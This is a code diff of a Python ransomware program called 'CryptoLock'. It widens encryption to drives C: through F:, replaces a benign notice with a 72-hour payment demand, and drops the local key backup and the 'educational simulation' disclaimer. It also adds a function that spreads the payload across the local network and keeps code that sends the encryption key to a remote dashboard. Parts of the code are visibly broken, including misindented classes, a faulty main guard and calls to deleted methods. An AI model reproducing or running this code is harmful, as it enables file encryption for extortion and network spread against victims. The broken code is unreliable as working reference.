@@ -1,38 +1,56 @@
-# Part 1: Initialization and Setup
-
+# =========================
+# Imports
+# =========================
 import os
 import sys
-import requests
-import json
-from Crypto.Cipher import AES
-from Crypto.Protocol.KDF import PBKDF2
-from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad, unpad
 import base64
 import uuid
-from datetime import datetime, timedelta
 import time
-import ctypes
 import logging
 import threading
 import tkinter as tk
-from tkinter import filedialog, messagebox, simpledialog
+from tkinter import simpledialog, messagebox
 from tkinter import ttk
 from PIL import Image, ImageTk
 import socket
 import shutil
+from datetime import datetime
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
+import requests
+import ctypes
 
-# Step 1: Utility function to get the resource path
+# =========================
+# Constants & Config
+# =========================
+TERMINATION_KEY = "bingo"
+SECONDARY_TERMINATION_KEY = "stop"
+HOME_DIR = os.path.expanduser('~')
+TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')
+TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
+DRIVES_TO_ENCRYPT = ['C:', 'D:', 'E:', 'F:']
+EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
+PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
+DASHBOARD_URL = 'http://localhost'
+MAX_ATTEMPTS = 20
+DELAY = 5
+
+# =========================
+# Resource Path Utility
+# =========================
 def resource_path(relative_path):
     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
     return os.path.join(base_path, relative_path)
 
-# Step 2: Ensure the time directory exists
+# =========================
+# File & Machine ID Utilities
+# =========================
 def ensure_time_dir_exists():
     if not os.path.exists(TIME_DIR):
         os.makedirs(TIME_DIR)
 
-# Step 3: Function to load the machine id
 def load_machine_id():
     drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
     for drive in drives:
@@ -47,28 +65,9 @@ def load_machine_id():
                 continue
     return None
 
-# Global constants
-TERMINATION_KEY = "bingo"
-SECONDARY_TERMINATION_KEY = "stop"
-HOME_DIR = os.path.expanduser('~')
-TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')
-TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
-ICON_PATH = resource_path("img/app_icon.ico")
-LOGO_PATH = resource_path("img/logo.png")
-THANKS_PATH = resource_path("img/thank-you.png")
-
-# Step 4: Ensure the time directory exists at the start
-ensure_time_dir_exists()
-
-# Encryption Configuration
-DRIVES_TO_ENCRYPT = ['F:', 'E:']
-EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
-PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
-DASHBOARD_URL = 'http://localhost'
-MAX_ATTEMPTS = 20
-DELAY = 5
-
-# Step 5: Setup logging
+# =========================
+# Logging Setup
+# =========================
 logging.basicConfig(
     filename='encryption_log.txt',
     level=logging.INFO,
@@ -81,10 +80,10 @@ formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
 console_handler.setFormatter(formatter)
 logging.getLogger().addHandler(console_handler)
 
-# Part 2: EncryptionTool Class Initialization and Key Generation
-
+# =========================
+# Encryption Tool
+# =========================
 class EncryptionTool:
-    # Step 6: Initialize the EncryptionTool class
     def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
         self.drives = drives
         self.extensions = extensions
@@ -95,7 +94,6 @@ class EncryptionTool:
         self.key = self.generate_key(password)
         self.machine_id = str(uuid.uuid4())
 
-    # Step 7: Function to generate the encryption key
     def generate_key(self, password):
         try:
             salt = get_random_bytes(16)
@@ -106,33 +104,6 @@ class EncryptionTool:
             logging.error(f"Failed to generate key: {str(e)}")
             raise
 
-# Part 3: File Encryption Functions
-    # Step 8: Function to set the wallpaper
-    def set_wallpaper(self, path):
-        try:
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
-            logging.info(f"Wallpaper set successfully to {path}.")
-        except Exception as e:
-            logging.error(f"Failed to set wallpaper: {str(e)}")
-    # Step 9: Function to create important files
-    def create_important_files(self, directory_path):
-        try:
-            d_data_path = os.path.join(directory_path, 'D-Data')
-            os.makedirs(d_data_path, exist_ok=True)
-
-            filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
-            file_contents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']
-
-            for filename, content in zip(filenames, file_contents):
-                file_path = os.path.join(d_data_path, filename)
-                with open(file_path, 'w') as file:
-                    file.write(content)
-
-            logging.info(f"Created important files in '{d_data_path}'.")
-        except Exception as e:
-            logging.error(f"Failed to create important files: {str(e)}")
-
-    # Step 10: Function to encrypt a single file
     def encrypt_file(self, file_path):
         try:
             iv = get_random_bytes(16)
@@ -146,14 +117,12 @@ class EncryptionTool:
             logging.info(f"Encrypted {file_path}")
         except Exception as e:
             logging.error(f"Failed to encrypt {file_path}: {str(e)}")
-
-    # Step 11: Function to encrypt all files in a directory
     def encrypt_files_in_directory(self, directory_path):
+                    
         try:
             for root, dirs, files in os.walk(directory_path):
                 if '$RECYCLE.BIN' in root:
                     continue
-
                 for file in files:
                     if any(file.endswith(ext) for ext in self.extensions):
                         file_path = os.path.join(root, file)
@@ -162,16 +131,11 @@ class EncryptionTool:
         except Exception as e:
             logging.error(f"Failed to encrypt files in directory {directory_path}: {str(e)}")
 
-# Part 4: User Manual Creation and Key Management
-
-    # Step 12: Function to create a user manual
     def create_user_manual(self, directory_path):
         manual_content = f"""Dear User,
 Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}.
-Please keep this machine ID safe. You will need it along with your decryption key to unlock your files.
-In case of any issues or to obtain your decryption key, please contact your IT department or your system administrator for further details.
-Thank you,
-Your Security Team
+It means that you will not be able to access your files without the decryption key. The private key is stored in our servers and the only way to recieve
+your key to decrypt your files is making payment."YOU ONLY HAVE 72 HOURS TO MAKE PAYMENT!Contact to this email: xyz@gmail.com"
 """
         manual_path = os.path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
         try:
@@ -180,7 +144,7 @@ Your Security Team
             logging.info("User manual created successfully.")
         except Exception as e:
             logging.error(f"Failed to create user manual: {str(e)}")
-    # Step 13: Function to send the encryption key to the dashboard
+
     def send_key_to_dashboard(self):
         encoded_key = base64.b64encode(self.key).decode('utf-8')
         payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
@@ -201,39 +165,12 @@ Your Security Team
         logging.error("All attempts to send the key failed.")
         return False
 
-    # Step 13.1: Function to save the encryption key locally
-    def save_key_locally(self):
-        key_path = os.path.join('E:', 'encryption_key.txt')
-        try:
-            os.makedirs(os.path.dirname(key_path), exist_ok=True)
-            with open(key_path, 'w') as file:
-                file.write(f"Machine ID: {self.machine_id}\n")
-                file.write(f"Encryption Key: {base64.b64encode(self.key).decode('utf-8')}\n")
-            logging.info(f"Encryption key saved locally to {key_path}.")
-            return True
-        except Exception as e:
-            logging.error(f"Failed to save encryption key locally: {str(e)}")
-            return False
-        
-    # Step 14: Function to save the machine ID
-    def save_machine_id(self, directory_path):
-        machine_id_path = os.path.join(directory_path, "Machine_id.txt")
-        try:
-            os.makedirs(directory_path, exist_ok=True)
-            with open(machine_id_path, 'w') as file:
-                file.write(self.machine_id)
-            logging.info(f"Machine ID saved successfully to {machine_id_path}.")
-        except Exception as e:
-            logging.error(f"Failed to save Machine ID: {str(e)}")
-
-    # Step 15: Function to process a drive (create files, encrypt, etc.)
     def process_drive(self, drive):
         self.create_important_files(drive)
         self.encrypt_files_in_directory(drive)
         self.create_user_manual(drive)
         self.save_machine_id(drive)
 
-    # Step 16: Execute the encryption process
     def execute(self):
         for drive in self.drives:
             logging.info(f"Processing drive {drive}")
@@ -246,13 +183,11 @@ Your Security Team
             logging.info("Encryption key sent successfully.")
         else:
             logging.error("Failed to send encryption key.")
-        wallpaper_path = resource_path('img/wallpaper.png')
-        self.set_wallpaper(wallpaper_path)
         logging.info("Encryption process completed.")
 
-# Part 5: Dialog Classes for User Interaction
-
-# Step 17: Define TerminationKeyDialog class for user interactions
+# =========================
+# Dialog Classes
+# =========================
 class TerminationKeyDialog(tk.Toplevel):
     def __init__(self, parent, icon_path):
         super().__init__(parent)
@@ -269,8 +204,7 @@ class TerminationKeyDialog(tk.Toplevel):
     def on_submit(self):
         self.result = self.key_entry.get()
         self.destroy()
-    # Step 18: Define CustomSecondaryTerminationKeyDialog class for user interactions
-class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
+        class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
     def __init__(self, parent, icon_path, title, prompt):
         self.icon_path = icon_path
         self.prompt = prompt
@@ -297,7 +231,6 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
         position_down = int(screen_height / 2 - window_height / 2)
         self.geometry(f"+{position_right}+{position_down}")
 
-# Step 21: Define CountdownDialog class for countdown interactions
 class CountdownDialog(tk.Toplevel):
     def __init__(self, parent, countdown_time, close_app_callback):
         super().__init__(parent)
@@ -347,7 +280,6 @@ class CountdownDialog(tk.Toplevel):
         position_right = int(screen_width / 2 - window_width / 2)
         position_down = int(screen_height / 2 - window_height / 2)
         self.geometry(f"+{position_right}+{position_down}")
-    # Step 25: Define DeletionCountdownDialog class for deletion countdown interactions
 class DeletionCountdownDialog(tk.Toplevel):
     def __init__(self, parent, stop_deletion_callback):
         super().__init__(parent)
@@ -399,31 +331,6 @@ class DeletionCountdownDialog(tk.Toplevel):
         else:
             messagebox.showerror("Error", "Incorrect secondary termination key.")
 
-# Part 6: DecryptorApp Class and Initialization
-
-# Step 28: Setting up the main DecryptorApp class
-class DecryptorApp(tk.Tk):
-    def __init__(self):
-        super().__init__()
-        self.iconbitmap(ICON_PATH)
-        self.title("CryptoLock")
-        self.configure(bg='black')
-        self.geometry("900x800")
-        self.timer_update_id = None
-        self.stop_deletion = False
-        self.deletion_stopped = False
-        self.initialize_ui()
-        self.protocol("WM_DELETE_WINDOW", self.on_close_window)
-        self.stop_event = threading.Event()
-
-        self.machine_id = load_machine_id()
-        if self.machine_id:
-            self.load_timer_state()
-        else:
-            messagebox.showerror("Error", "No machine ID found. The application will exit.")
-            self.destroy()
-
-        threading.Thread(target=self.check_for_remote_stop_signal, args=(self.machine_id,), daemon=True).start()
 
     # Step 29 : Function to check for remote stop signal
     def check_for_remote_stop_signal(self, machine_id, check_interval=10):
@@ -439,6 +346,7 @@ class DecryptorApp(tk.Tk):
             except requests.exceptions.RequestException as e:
                 pass
             time.sleep(check_interval)
+
     # Step 29.1: Function to stop the deletion process remotely
     def stop_deletion_process_remotely(self):
         if not self.stop_deletion:
@@ -449,54 +357,11 @@ class DecryptorApp(tk.Tk):
             if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
                 self.deletion_dialog.destroy()
                 self.deletion_dialog = None
-
-    # Step 30: Function to initialize the UI
-    def initialize_ui(self):
-        self.iconbitmap(ICON_PATH)
-        logo_image = Image.open(LOGO_PATH).resize((200, 200))
-        logo_photo = ImageTk.PhotoImage(logo_image)
-        frame = tk.Frame(self, bg='black')
-        frame.pack(pady=(20, 20))
-        logo_label = tk.Label(frame, image=logo_photo, bg='black')
-        logo_label.image = logo_photo
-        logo_label.pack(side=tk.LEFT, padx=(20, 10))
-        ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
-        | Attention: Your Files Are Encrypted | \n\n
-        This simulation is solely for educational purposes and must not be used maliciously.
-        Users are fully accountable for their actions.
-        Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n
-         To Recover Your Files: \n
-        Ping Us at [ mykeys@cryptolock.xyz ]"""
-
-        ransom_note_label = tk.Text(frame, bg='black', font=('Helvetica', 12), wrap='word', height=16, width=60, borderwidth=0)
-        ransom_note_label.pack(side=tk.LEFT, padx=(10, 20))
-        ransom_note_label.insert(tk.END, " Proof of Concept: Ransomware Simulation \n", "center_red")
-        ransom_note_label.insert(tk.END, "| Attention: Your Files Are Encrypted | \n\n", "center_red")
-        ransom_note_label.insert(tk.END, "This simulation is solely for educational purposes and must not be used maliciously.\n", "center_green")
-        ransom_note_label.insert(tk.END, "Users are fully accountable for their actions.\n", "center_white")
-        ransom_note_label.insert(tk.END, "Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n", "center_white")
-        ransom_note_label.insert(tk.END, "  To Recover Your Files: \n", "center_yellow")
-        ransom_note_label.insert(tk.END, "Ping Us at [ mykeys@cryptolock.xyz ]\n", "center_yellow")
-        ransom_note_label.tag_configure("center", justify='center')
-        ransom_note_label.tag_configure("center_red", justify='center', foreground="red")
-        ransom_note_label.tag_configure("center_green", justify='center', foreground="green")
-        ransom_note_label.tag_configure("center_white", justify='center', foreground="white")
-        ransom_note_label.tag_configure("center_yellow", justify='center', foreground="yellow")
-        ransom_note_label.tag_add("center", "1.0", "1.end")
-        ransom_note_label.tag_add("center_red", "1.0", "2.end")
-        ransom_note_label.tag_add("center_green", "4.0", "4.end")
-        ransom_note_label.tag_add("center_white", "5.0", "6.end")
-        ransom_note_label.tag_add("center_yellow", "8.0", "9.end")
-        ransom_note_label.configure(state='disabled')
-
-        self.timer_label = tk.Label(self, text="", fg='red', bg='black', font=('Helvetica', 12))
-        self.timer_label.pack(pady=(10, 10))
-
-        self.setup_key_frame()
-        self.setup_log_frame()
-        self.setup_progress_frame()
-
+                # =========================
+# Dashboard Reporting
+# =========================
 def report_key_to_dashboard(machine_id, key, dashboard_url, max_attempts=20, delay=5):
+    import base64, json, requests, time, logging
     encoded_key = base64.b64encode(key).decode('utf-8')
     payload = {'machine_id': machine_id, 'encryption_key': encoded_key}
     headers = {'Content-Type': 'application/json'}
@@ -515,8 +380,9 @@ def report_key_to_dashboard(machine_id, key, dashboard_url, max_attempts=20, del
     logging.error("All attempts to send the key failed.")
     return False
 
-# Part 7: Main Execution Block
-
+# =========================
+# Auto-Spread Functionality
+# =========================
 def auto_spread_ransomware(ransomware_path):
     import socket, shutil, logging
     local_ip = socket.gethostbyname(socket.gethostname())
@@ -541,7 +407,11 @@ def auto_spread_ransomware(ransomware_path):
             except Exception:
                 continue
 
-if __name__ == "__main__":
+# =========================
+# Main Execution
+# =========================
+if name == "__main__":
+    ensure_time_dir_exists()
     machine_id = load_machine_id()
     if not machine_id:
         encryption_tool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSIONS_TO_ENCRYPT, PASSWORD_PROVIDED, DASHBOARD_URL, MAX_ATTEMPTS, DELAY)
